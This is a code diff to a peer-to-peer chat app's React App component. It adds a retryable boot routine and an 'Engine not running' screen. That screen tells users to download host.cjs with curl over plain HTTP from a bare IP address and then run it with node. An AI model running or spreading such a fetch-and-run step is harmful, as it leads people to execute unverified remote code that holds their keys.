@@ -30,7 +30,7 @@ export interface DM {
     unread: number;
 }
 
-type Phase = 'boot' | 'onboarding' | 'locked' | 'ready';
+type Phase = 'boot' | 'onboarding' | 'locked' | 'ready' | 'noengine';
 
 export default function App() {
     const {
@@ -80,6 +80,7 @@ export default function App() {
     const [avatarBytes, setAvatarBytes] = useState<number[] | null>(null);
     const [pendingHash, setPendingHash] = useState<string | null>(null);
     const [showMembers, setShowMembers] = useState(true);
+    const [engineError, setEngineError] = useState<string | null>(null);
     /** Incoming friend requests from peers who scanned our code. */
     const [friendRequests, setFriendRequests] = useState<{peerId: string; displayName: string; avatarHash: string | null}[]>([]);
     const booted = useRef(false);
@@ -366,32 +367,38 @@ export default function App() {
         }
     };
 
+    const runBoot = async () => {
+        booted.current = true;
+        try {
+            if (!(await hasIdentity())) {
+                setPhase('onboarding');
+                return;
+            }
+            if (!(await isUnlocked())) {
+                setPhase('locked');
+                return;
+            }
+            setPhase('ready');
+            await refreshServers();
+            await loadProfiles();
+            try {
+                setOnline(new Set(await onlinePeers()));
+            } catch {
+                // presence is best-effort
+            }
+        } catch (e) {
+            // Engine unreachable (or any boot failure) — show the retry
+            // screen instead of a misleading login form.
+            setEngineError(e instanceof Error ? e.message : String(e));
+            setPhase('noengine');
+            booted.current = false; // allow retry
+        }
+    };
+
     useEffect(() => {
         if (booted.current) return;
-        booted.current = true;
-        void (async () => {
-            try {
-                if (!(await hasIdentity())) {
-                    setPhase('onboarding');
-                    return;
-                }
-                if (!(await isUnlocked())) {
-                    setPhase('locked');
-                    return;
-                }
-                setPhase('ready');
-                await refreshServers();
-                await loadProfiles();
-                try {
-                    setOnline(new Set(await onlinePeers()));
-                } catch {
-                    // presence is best-effort
-                }
-            } catch (e) {
-                setError(String(e));
-                setPhase('locked');
-            }
-        })();
+        void runBoot();
+        // eslint-disable-next-line react-hooks/exhaustive-deps
     }, []);
 
     useEffect(() => {
@@ -1059,6 +1066,40 @@ export default function App() {
 
     if (phase === 'boot') {
         return <div className="flex h-full w-full items-center justify-center bg-surface-1"/>;
+    }
+
+    if (phase === 'noengine') {
+        return (
+            <>
+                <div className="flex h-full w-full flex-col items-center justify-center gap-5 bg-surface-1 px-6 text-center">
+                    <div className="flex h-16 w-16 items-center justify-center rounded-2xl bg-surface-2 text-2xl text-warn">!</div>
+                    <div>
+                        <h1 className="text-lg font-bold text-ink">Engine not running</h1>
+                        <p className="mx-auto mt-2 max-w-[420px] text-sm leading-relaxed text-muted">
+                            The Peers window is just the shell — the engine process holds your keys
+                            and the swarm. Start it, then press retry.
+                        </p>
+                    </div>
+                    {engineError && (
+                        <code className="max-w-[480px] rounded-lg border border-edge bg-surface-2 px-3 py-2 font-mono text-[11px] text-warn">
+                            {engineError}
+                        </code>
+                    )}
+                    <div className="rounded-lg border border-edge bg-surface-2 px-4 py-3 text-left font-mono text-xs text-muted">
+                        <div><span className="text-faint"># one-time:</span> curl -O http://213.136.86.78:8080/host.cjs</div>
+                        <div><span className="text-faint"># every session:</span></div>
+                        <div>node host.cjs</div>
+                    </div>
+                    <button
+                        onClick={() => { setEngineError(null); setPhase('boot'); void runBoot(); }}
+                        className="rounded-lg bg-accent px-6 py-2 text-sm font-semibold text-black hover:bg-accent-hover"
+                    >
+                        Retry connection
+                    </button>
+                </div>
+                <DialogHost controller={dialogController}/>
+            </>
+        );
     }
 
     if (phase !== 'ready') {
